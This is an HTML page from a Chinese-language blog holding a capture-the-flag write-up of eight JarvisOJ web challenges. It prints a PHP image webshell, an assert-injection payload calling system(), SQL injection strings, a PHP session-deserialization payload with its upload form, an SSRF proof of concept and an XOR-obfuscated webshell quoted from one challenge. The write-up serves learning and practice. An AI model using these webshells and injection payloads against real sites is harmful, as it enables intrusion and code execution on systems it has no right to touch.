@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="JarvisOJ - Web の Write-Up Part 2"><meta name="keywords" content="Web"><meta name="author" content="ColdSnap"><meta name="copyright" content="ColdSnap"><title>JarvisOJ - Web の Write-Up Part 2 | ColdSnap の Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-4826942730187324',
+  enable_page_level_ads: 'true'
+});
+</script><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ColdSnap の Blog" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">1.</span> <span class="toc-text">RE?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Injection"><span class="toc-number">2.</span> <span class="toc-text">Simple Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Gallery"><span class="toc-number">3.</span> <span class="toc-text">Easy Gallery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyphp"><span class="toc-number">4.</span> <span class="toc-text">Babyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Inject"><span class="toc-number">5.</span> <span class="toc-text">Inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">6.</span> <span class="toc-text">WEB?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo"><span class="toc-number">7.</span> <span class="toc-text">phpinfo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chopper"><span class="toc-number">8.</span> <span class="toc-text">Chopper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-Be-Continue"><span class="toc-number">9.</span> <span class="toc-text">To Be Continue</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">ColdSnap</div><div class="author-info__description text-center">Welcome to ColdSnap の Blog</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/Coldwave96">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">91</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">41</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">35</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://bodhidharmalu.github.io">Tigerlu</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://ghealer.top">Ghealer</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ColdSnap の Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/Library">Library</a><a class="site-page" href="/Tools">Tools</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">JarvisOJ - Web の Write-Up Part 2</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-01</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WriteUPs/">WriteUPs</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WriteUPs/JarvisOJ/">JarvisOJ</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.6k</span><span class="post-meta__separator">|</span><span>阅读时长: 6 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>接上回书说到JarvisOJ的Web部分题目<a href="https://coldwave96.github.io/2020/03/11/JarvisOJ-WEB-1/">Part 1</a>，现在继续分解Part 2。</p>
+<span id="more"></span>
+
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h2><p>打开链接下载得到一个udf.so文件，搜索了一下这是个mysql的插件。首先查看mysql插件的存放位置：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB1.png"></p>
+<p>然后把下载的文件放到这个目录下面，按照题目提示的help_me()函数一步一步探寻即可找到flag：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB2.png"></p>
+<h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>打开是一个登录界面，burp抓包使用sqlmap跑出来username存在注入漏洞，不过由于过滤了空格所以需要加参数—tamper&#x3D;space2comment</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB3.png"></p>
+<p>最后得到password的值为334cfb59c9d74849801d5acdcfdaadc3。</p>
+<p>解md5后得:eTAloCrEP。</p>
+<p>登陆后得到flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p>
+<h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>打开是一个网站，submit和view界面分别可以上传图片和查看图片：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB4.png"></p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB5.png"></p>
+<p>上传图片有验证，修改上传文件后缀和抓包更改content-type都不行。猜测验证机制在后台并且会检测文件头，那只能选择一句话图片马了。上传之后会返回图片ID，在view界面输入id和type可以看到自己的图片。</p>
+<p>但是这并没有什么用啊，没法执行。查看主页url发现一个很有趣的参数page，猜测这个参数存在文件包含漏洞。尝试了一下，提示里有信息：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB6.png"></p>
+<p>系统会给文件自动添加一个.php的后缀，尝试%00截断，没有回显。应该是存在截断漏洞，但是被某种方法防护了。猜测是后台过滤了一些东西，找了些提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>换了一个小马，重新制作图片马，重新上传加首页包含：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB7.png"></p>
+<h2 id="Babyphp"><a href="#Babyphp" class="headerlink" title="Babyphp"></a>Babyphp</h2><p>打开是一个网站，在About界面提到了GIT，通过<a target="_blank" rel="noopener" href="https://github.com/ring04h/weakfilescan">weakfilescan</a>扫到了config文件：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB8.png"></p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB9.png"></p>
+<p>猜测存在git泄露，通过<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a>得到网站源代码：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB10.png"></p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB11.png"></p>
+<p>在index.php源代码中发现漏洞：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB12.png"></p>
+<p>assert函数解释：</p>
+<p>assert(mixed $assertion [, Throwable $exception])</p>
+<p>assert()会检查指定的assertion并在结果为FALSE时采取适当的行动.就是说如果assertion是字符串，它将会被assert()当做PHP代码来执行。所以构造payload：<code>page=&#39;.system(&quot;cat templates/flag.php&quot;).&#39;</code></p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB13.png"></p>
+<h2 id="Inject"><a href="#Inject" class="headerlink" title="Inject"></a>Inject</h2><p>根据题目的提示寻找源码，扫到index.php～文件，查看页面源代码：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB14.png"></p>
+<p>关于该段源代码的详细分析，推荐参考这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42939527/article/details/100129254">Blog</a>。</p>
+<p>最终构造payload：?table&#x3D;test` `union select group_concat(flagUwillNeverKnow) from secret_flag获得flag。</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h2><p>打开链接只是一个登录框，试了半天的注入，折腾很久毫无收获，查看源码,有个奇怪的app.js：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB15.png"></p>
+<p>格式化一下javascript脚本：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB16.png"></p>
+<p>输入的密码应该是被以POST方式发送出去了，于是在源代码中找下post，看下能不能发现什么线索：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB17.png"></p>
+<p>在这段代码上方不远处找到一个有趣的函数：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB18.png"></p>
+<p>把value部分提出来看下：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB19.png"></p>
+<p>貌似是个方程组，解一下得到25个解：</p>
+<p>data &#x3D; [81,87,66,123,82,51,97,99,55,95,49,115,95,105,110,116,101,114,101,115,116,105,110,103,125]</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>运行python脚本即可获得flag。</p>
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>打开页面后是源代码：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB20.png"></p>
+<p>仔细阅读代码，加上题目提示的phpinfo.php界面看到的phpinfo信息，发现是php的seesion的反序列化问题。具体的问题分析可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78430690">这里</a>。</p>
+<p>构造一个上传和post同时进行的情况：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>test XXE<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="comment">&lt;!-- 	</span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span> = <span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成payload：<code>O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</code></p>
+<p>但是要在双引号前加上反斜杠，防止转义错误；还要在O前面加上“|”：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p>
+<p>利用上面的上传界面随意上传一个文件，然后使用BP截包，把文件名改为payload即可得到flag文件名“Here_1s_7he_fl4g_buT_You_Cannot_see.php”。</p>
+<p>然后再次把“_FILE_”改成：”&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php”即可获得flag。</p>
+<h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><p>首先看到的是一把菜刀：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB21.png"></p>
+<p>点击管理员登录提示<code>you are not admin!</code></p>
+<p>查看图片地址为<code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></p>
+<p>一下子精神了，也许是远程文件包含？</p>
+<p>再看了一下管理员界面源码：</p>
+<p><img src="/img/JarvisOJ-WEB-2/WEB22.png"></p>
+<p>尝试了加X-Forwarded-For头部，发现并没什么用。</p>
+<p>于是构造POC：<code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code>即可访问到admin目录。</p>
+<p>接下来扫描目录，在robots.txt中找到木马文件trojan.php及该木马的源码trojan.php.txt。</p>
+<p>但是源码是进行异或处理的:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;( &quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;[&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;;&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;*&quot;</span>^<span class="string">&quot;~&quot;</span>);$&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;((<span class="string">&quot;-&quot;</span>^<span class="string">&quot;H&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;+&quot;</span>). (<span class="string">&quot;[&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;,&quot;</span>^<span class="string">&quot;@&quot;</span>). (<span class="string">&quot;&#125;&quot;</span>^<span class="string">&quot;U&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;A&quot;</span>). (<span class="string">&quot;(&quot;</span>^<span class="string">&quot;w&quot;</span>).(<span class="string">&quot;j&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;i&quot;</span>^<span class="string">&quot;&amp;&quot;</span>). (<span class="string">&quot;#&quot;</span>^<span class="string">&quot;p&quot;</span>). (<span class="string">&quot;&gt;&quot;</span>^<span class="string">&quot;j&quot;</span>). (<span class="string">&quot;!&quot;</span>^<span class="string">&quot;z&quot;</span>). (<span class="string">&quot;T&quot;</span>^<span class="string">&quot;g&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;S&quot;</span>). (<span class="string">&quot;_&quot;</span>^<span class="string">&quot;o&quot;</span>). (<span class="string">&quot;?&quot;</span>^<span class="string">&quot;b&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;t&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了知道这个webshell的密码，把木马文件放在本地的Web服务器上执行，通过报错知道密码为360。</p>
+<p>最后利用密码POST数据<code>360 = system(&#39;ls&#39;)</code>，即可获得flag：CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}。</p>
+<h2 id="To-Be-Continue"><a href="#To-Be-Continue" class="headerlink" title="To Be Continue"></a>To Be Continue</h2><p>JarvisOJ的Web部分题目暂告一段落，还有几题没做，后面有动力做了的话再单独写下WriteUps。最近迷上学习的PWN&amp;Reverse了，虽然他们虐我千百遍，我却仍待他们如初恋（我怎么这么菜啊T.T）。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ColdSnap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://coldwave96.github.io/2020/05/01/JarvisOJ-WEB-2/">https://coldwave96.github.io/2020/05/01/JarvisOJ-WEB-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://coldwave96.github.io">ColdSnap の Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/05/01/Diary1/"><i class="fa fa-chevron-left">  </i><span>随笔 1</span></a></div><div class="next-post pull-right"><a href="/2020/05/01/GDBcommand/"><span>常用GDB指令</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+var verify = 'false' == 'true';
+var record_ip = '' == 'true';
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  recordIP:record_ip,
+  appId:'R82KAmOmkqMWNJs72Fx4ub1O-gzGzoHsz',
+  appKey:'Sq4B8VcTqxJ2qCeJLJa3KbKz',
+  placeholder:'Please leave something ^.^',
+  avatar:'mm',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2025 By ColdSnap</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="icp"><a><span>Welcome to my world ^.^</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
